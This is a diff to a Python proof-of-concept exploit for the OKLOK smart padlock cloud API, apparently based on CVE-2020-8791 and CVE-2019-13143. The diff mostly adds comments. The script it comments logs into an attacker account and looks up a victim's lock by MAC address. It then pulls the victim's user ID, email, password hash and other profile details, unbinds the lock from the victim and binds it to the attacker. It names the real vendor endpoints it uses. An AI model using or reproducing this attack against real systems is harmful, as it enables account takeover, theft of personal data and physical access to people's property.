@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
-#PoC attack scenario based on CVE-2020-8791 and CVE-
+#PoC physically proximate attack scenario based on CVE-2020-8791 and CVE-2019-13143 
+#See original CVE-2019-13143 PoC exploit code by securelayer7 (https://github.com/securelayer7/pwnfb50/blob/master/pwnfb50.py)
+
 #unbind lock from victim account, bind to attacker account, retrieve user account details
 
 import requests
@@ -9,7 +11,7 @@ import sys
 import datetime
 import getpass
 
-
+#login to the attacker account and obtain attacker token to be used in further HTTP requests
 def login_attacker(attacker_email_address, attacker_password):
         
     url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'
@@ -45,6 +47,7 @@ def login_attacker(attacker_email_address, attacker_password):
     else:
         sys.exit('Login not successful.')
 
+#retrieve lockId, barcode, lock name
 def device_query(attacker_token, victim_mac, headers):
    
     url = 'https://app.oklok.com.cn/oklock/lock/queryDevice'
@@ -65,6 +68,7 @@ def device_query(attacker_token, victim_mac, headers):
         sys.exit('HTTP Error -- Query not successful.')
     return lockId, barcode, name
 
+#get userId, email
 def device_info(barcode, attacker_token, headers):
    
     url = 'https://app.oklok.com.cn/oklock/lock/getDeviceInfo'
@@ -86,6 +90,7 @@ def device_info(barcode, attacker_token, headers):
 
     return userId, email
 
+#get acct_creation, cid, nickname, password_hash, qrUrl, picUrl, prints_name
 def get_more_info(victim_userID, attacker_token, lockId, headers):
 
     get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'
@@ -132,7 +137,7 @@ def get_more_info(victim_userID, attacker_token, lockId, headers):
 
     return acct_creation, cid, nickname, password_hash, qrUrl, picUrl, prints_name
 
-
+#unbind lock from victim account
 def unbind(userId, lockId, attacker_token, headers):
    
     url = 'https://app.oklok.com.cn/oklock/lock/unbind'
@@ -150,7 +155,7 @@ def unbind(userId, lockId, attacker_token, headers):
     else:
         sys.exit('HTTP Error Code -- Lock could not be unbound from victim.')
 
-
+#bind lock to attacker account
 def bind(attacker_userID, mac, name, attacker_token, headers):
    
     url = 'https://app.oklok.com.cn/oklock/lock/bind'
